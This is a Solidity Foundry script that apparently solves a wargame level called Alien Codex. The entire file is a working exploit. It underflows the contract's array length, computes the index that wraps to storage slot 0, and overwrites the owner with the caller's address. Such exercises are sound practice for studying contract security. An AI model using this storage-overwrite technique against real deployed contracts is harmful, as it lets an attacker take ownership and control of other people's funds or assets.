// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IAlien {

    function owner() external view returns (address);
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexSolve is Script {
    function run () external {
        vm.startBroadcast();
        IAlien alien = IAlien(0x262D6cd034351284c20E8Dc7edD13A5484DDC61A);
        alien.makeContact();
        alien.retract(); // overflow array lenght
        uint256 i;
        unchecked {
            i = 0 - uint256(keccak256(abi.encode(uint256(1)))); // overflow slot
        }
        alien.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(alien.owner() == msg.sender, "failed");
        vm.stopBroadcast();
    }
}